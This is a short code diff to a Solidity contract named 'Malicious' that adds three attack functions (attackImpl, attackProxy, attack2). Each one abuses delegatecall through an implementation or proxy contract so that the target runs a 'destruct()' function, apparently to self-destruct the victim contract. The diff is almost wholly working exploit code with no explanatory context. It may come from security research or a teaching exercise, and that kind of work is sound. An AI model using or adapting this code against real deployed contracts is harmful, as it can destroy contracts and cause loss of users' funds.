@@ -18,9 +18,19 @@ contract Malicious {
     /*
       * Function that call the exploit in implementation contract
       */
-    function attack(address _impl) external {
+    function attackImpl(address _impl) external {
+      bytes memory data = abi.encodeWithSignature("destruct()");
+      IImpl(_impl).delegatecallContract(address(this),data);
+    }
+
+    function attackProxy(address _proxy) external {
       bytes memory data = abi.encodeWithSignature("delegatecallContract(address,bytes)", address(this), abi.encodeWithSignature("destruct()"));
-      IImpl(_impl).callContract(_impl,data);
+      _proxy.call(data);
+    }
+
+    function attack2(address _imp) external {
+      bytes memory data = abi.encodeWithSignature("delegatecallContract(address,bytes)", address(this), abi.encodeWithSignature("destruct()"));
+      _imp.delegatecall(data);
     }
 
     /*
